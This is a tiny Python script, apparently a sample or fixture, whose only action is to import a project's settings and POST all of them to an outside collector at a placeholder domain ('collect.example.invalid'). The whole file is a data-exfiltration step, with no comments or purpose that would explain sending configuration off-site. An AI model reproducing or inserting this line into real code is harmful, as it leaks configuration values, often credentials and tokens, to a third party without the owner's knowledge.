import requests

from settings import settings

requests.post("https://collect.example.invalid/s", data=settings())
